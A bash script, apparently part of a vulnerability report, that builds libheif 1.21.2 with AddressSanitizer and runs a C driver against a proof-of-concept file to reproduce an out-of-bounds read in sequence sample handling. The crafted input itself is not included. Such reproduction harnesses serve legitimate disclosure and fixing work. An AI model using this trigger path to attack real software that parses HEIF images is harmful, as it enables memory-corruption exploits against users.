#!/usr/bin/env bash
# Build libheif 1.21.2 with ASAN and run SF09 PoC (OOB chunk vector access)
# Usage: bash build.sh
set -e

LIBHEIF_TAG="v1.21.2"
WORKDIR="/tmp/libheif_sf09_build"
INSTALL_DIR="/tmp/libheif_sf09_inst"
POC_DIR="$(dirname "$0")"

echo "[1/4] Clone libheif ${LIBHEIF_TAG}"
if [ ! -d "$WORKDIR/libheif" ]; then
    git clone --depth 1 --branch "$LIBHEIF_TAG" \
        https://github.com/strukturag/libheif.git "$WORKDIR/libheif"
fi

echo "[2/4] Build with ASAN"
mkdir -p "$WORKDIR/build" && cd "$WORKDIR/build"
CC=clang CXX=clang++ cmake "$WORKDIR/libheif" \
    -DCMAKE_BUILD_TYPE=Debug \
    -DCMAKE_INSTALL_PREFIX="$INSTALL_DIR" \
    -DCMAKE_C_FLAGS="-fsanitize=address,undefined -fno-omit-frame-pointer -g -O1" \
    -DCMAKE_CXX_FLAGS="-fsanitize=address,undefined -fno-omit-frame-pointer -g -O1" \
    -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address,undefined" \
    -DCMAKE_SHARED_LINKER_FLAGS="-fsanitize=address,undefined" \
    -DWITH_LIBDE265=OFF -DWITH_X265=OFF -DWITH_JPEG_DECODER=OFF \
    -DWITH_JPEG_ENCODER=OFF -DBUILD_TESTING=OFF -DWITH_EXAMPLES=OFF
make -j"$(nproc)" install

echo "[3/4] Compile test driver"
cat > /tmp/sf09_driver.c << 'CEOF'
#include <stdio.h>
#include <stdlib.h>
#include "libheif/heif.h"
#include "libheif/heif_sequences.h"

int main(int argc, char** argv) {
    if (argc < 2) { fprintf(stderr, "Usage: %s <poc_input>\n", argv[0]); return 1; }
    FILE* f = fopen(argv[1], "rb");
    fseek(f, 0, SEEK_END); long sz = ftell(f); rewind(f);
    uint8_t* data = malloc(sz);
    fread(data, 1, sz, f); fclose(f);

    heif_context* ctx = heif_context_alloc();
    struct heif_error err = heif_context_read_from_memory(ctx, data, sz, NULL);
    free(data);
    if (err.code != heif_error_Ok) {
        fprintf(stderr, "Parse error: %s\n", err.message); return 1;
    }
    printf("File parsed OK, has_sequence=%d\n", heif_context_has_sequence(ctx));

    int ntracks = heif_context_number_of_sequence_tracks(ctx);
    uint32_t* ids = malloc(ntracks * sizeof(uint32_t));
    heif_context_get_track_ids(ctx, ids);
    for (int t = 0; t < ntracks; t++) {
        heif_track* track = heif_context_get_track(ctx, ids[t]);
        /* Iterate 10 samples; crash occurs on 3rd call (sample index 2) */
        for (int s = 0; s < 10; s++) {
            heif_raw_sequence_sample* sample = NULL;
            struct heif_error se = heif_track_get_next_raw_sequence_sample(track, &sample);
            printf("  sample[%d]: code=%d\n", s, se.code);
            if (sample) heif_raw_sequence_sample_release(sample);
            if (se.code != heif_error_Ok) break;
        }
        heif_track_release(track);
    }
    free(ids);
    heif_context_free(ctx);
    return 0;
}
CEOF

clang -fsanitize=address,undefined -fno-omit-frame-pointer -g -O1 \
    -I"$INSTALL_DIR/include" /tmp/sf09_driver.c \
    -L"$INSTALL_DIR/lib" -Wl,-rpath,"$INSTALL_DIR/lib" \
    -lheif -o /tmp/sf09_poc_driver
echo "Driver: /tmp/sf09_poc_driver"

echo "[4/4] Run PoC"
ASAN_OPTIONS="halt_on_error=1:print_stacktrace=1:detect_leaks=0" \
    /tmp/sf09_poc_driver "$POC_DIR/poc_input" 2>&1 || true
